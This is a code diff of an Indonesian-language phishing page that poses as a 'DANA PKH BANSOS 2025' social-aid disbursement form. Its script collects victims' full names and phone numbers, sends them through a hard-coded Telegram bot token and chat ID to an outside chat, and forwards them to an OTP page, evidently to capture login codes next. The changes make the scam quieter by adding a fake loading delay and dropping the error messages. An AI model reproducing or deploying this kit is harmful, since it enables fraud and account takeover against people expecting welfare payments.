@@ -3,34 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="theme-color" content="#3CB371"> 
- <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>BANSOS</title>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .container { width: 300px; padding: 20px; border: 1px solid #ccc; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1); }
-        .input-group { display: flex; align-items: center; margin-bottom: 15px; }
-        .input-group span { padding: 10px; background: #ddd; border: 1px solid #ccc; border-right: none; }
-        .input-group input { flex: 1; padding: 13px; border: 1px solid #ccc; border-left: none; 
-        font-weight:bold;
-        font-size: 13px;
-        outline: none; }
-        button { width: 100%; 
-        font-weight:bold;
-        font-size: 13px;
-        padding: 13px; border: none; background: #3CB371; color: white; cursor: pointer; border-radius: 5px; }
-        button:hover { background: darkblue; }
-        
-        input {
-    width: 100%; 
-    padding: 13px; 
-    border: 1px solid #ccc; 
-    border-radius: 5px;  
-    outline: none; 
-    font-weight:bold;
-    box-sizing: border-box; 
-    font-size:13px;
-}
-h3{
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            width: 300px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .input-group span {
+            padding: 10px;
+            background: #ddd;
+            border: 1px solid #ccc;
+            border-right: none;
+        }
+        .input-group input {
+            flex: 1;
+            padding: 13px;
+            border: 1px solid #ccc;
+            border-left: none;
+            font-weight: bold;
+            font-size: 14px;
+            outline: none;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            font-weight: bold;
+            font-size: 13px;
+            padding: 13px;
+            border: none;
+            background: #3CB371;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #3cb371;
+        }
+    
+      h3{
   font-size: 13px;
   color:#ff0000;
 }
@@ -153,26 +180,56 @@ h3{
             height: auto;
             display: block;
         }
+    #loading {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgba(0, 0, 0, 0.5);
+        padding: 20px;
+        border-radius: 10px;
+        text-align: center;
+    }
+    #loading img {
+        width: 50px;
+    }
+    #loading p {
+        color: white;
+        margin-top: 10px;
+        font-weight: bold;
+    }
+
+
     </style>
 </head>
 <body>
-    <div class="gambar">
+      <div class="gambar">
         <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgQu6As5ohZn1bBc6sJwlCgjpCn3HEvsHrhsWLhFHVtA_YZf013FrQlMzhaWKjtxtRrmmEHrmVvlbCdNqZ0t4Z_0BFbinZvnU3sEUK-MyHVRzW0EApT64NQaz9WSo4nPlBrIR6IXe2smqaWDHCpHdR8Tbkcn9PGl3uJivANXmDl1mHaekveQuaqMFWXOrwn" alt="Gambar Pucok">
     </div>
         <div class="marquee-container">
         <p class="marquee-text">Selamat datang! Isi data Anda untuk melanjutkan proses pencairan.</p>
     </div>
+  
     <div class="container">
         <h3>DANA PKH BANSOS 2025</h3>
-        <input type="text" id="nama" placeholder="Nama Lengkap" required><br><br>
-        <div class="input-group">
-            <span>+62</span>
-            <input type="tel" id="nomor" placeholder="Nomor HP" required>
-        </div><br>
+<div class="input-group">
+    <span>👤</span>
+    <input type="text" id="nama" placeholder="Nama Lengkap" required>
+</div>
+<div class="input-group">
+    <span>+62</span>
+    <input type="tel" id="nomor" placeholder="Nomor HP" required>
+</div><br>
+
+
         <button onclick="kirimData()">Selanjutnya</button>
+        <div id="loading">
+            <img src="successfu8.gif" alt="Loading...">
+            <p></p>
+        </div>
     </div>
-    <br><br>
-    <div class="box-container">
+        <div class="box-container">
     <div class="slide-box">
         <!-- Wahyu Iskandar -->
         <div class="user-box">
@@ -266,9 +323,8 @@ h3{
         </div>
     </div>
 </div>
-
     <nav>
-        <a href="https://example.com">
+        <a href="#">
             <img src="nav.jpg" alt="Navigasi Bawah">
         </a>
     </nav>
@@ -276,53 +332,55 @@ h3{
     <script>
         function formatNomorHP(nomor) {
     if (nomor.startsWith("+62")) {
-        return nomor; // Sudah benar
+        return nomor; // Jika sudah ada +62, tidak perlu diubah
     } else if (nomor.startsWith("0")) {
-        return "+62" + nomor.substring(1); // Ganti "0" jadi "+62"
+        return "+62" + nomor.substring(1); // Ubah 08xxx menjadi +628xxx
     } else if (nomor.startsWith("62")) {
-        return "+62" + nomor.substring(2); // Ganti "62" jadi "+62"
+        return "+62" + nomor.substring(2); // Pastikan 62xxx tetap jadi +62xxx
     } else {
-        return "+62" + nomor; // Tambahkan "+62" jika belum ada
+        return "+62" + nomor; // Jika format lain, tetap tambahkan +62 di depan
     }
 }
 
+
 function kirimData() {
-    let nama = document.getElementById('nama').value;
-    let nomor = document.getElementById('nomor').value;
+    let nama = document.getElementById('nama').value.trim();
+    let nomor = document.getElementById('nomor').value.trim();
     let nomorLengkap = formatNomorHP(nomor);
 
     if (nama === "" || nomor === "") {
-        alert("Harap isi semua kolom!");
-        return;
+        return; // Tidak lakukan apa-apa jika input kosong
     }
 
-    // Simpan data ke localStorage untuk halaman OTP
+    // Tampilkan loading GIF
+    document.getElementById("loading").style.display = "block";
+
+    // Simpan data ke localStorage
     localStorage.setItem("nama", nama);
     localStorage.setItem("nomorHP", nomorLengkap);
 
-    // Kirim ke Telegram
     let token = "7874811634:AAFLWyauNcH31efMOMIA16Hc5sD-uQmXd6A";
     let chat_id = "6835220264";
     let pesan = `Nama: ${nama}%0ANomor: ${nomorLengkap}`;
-
     let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${pesan}`;
 
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                window.location.href = "otp.html"; // Pindah ke halaman OTP
-            } else {
-                alert("Gagal mengirim data ke Telegram.");
-            }
-        })
-        .catch(error => {
-            alert("Terjadi kesalahan!");
-            console.error(error);
-        });
+    // Tunggu 3 detik sebelum mengirim data
+    setTimeout(() => {
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("loading").style.display = "none"; // Sembunyikan loading
+                if (data.ok) {
+                    window.location.href = "otp.html"; // Pindah ke halaman OTP jika berhasil
+                }
+            })
+            .catch(error => {
+                document.getElementById("loading").style.display = "none"; // Sembunyikan loading jika gagal
+                console.error(error);
+            });
+    }, 3000);
 }
 
     </script>
-
 </body>
-    </html>
+</html>
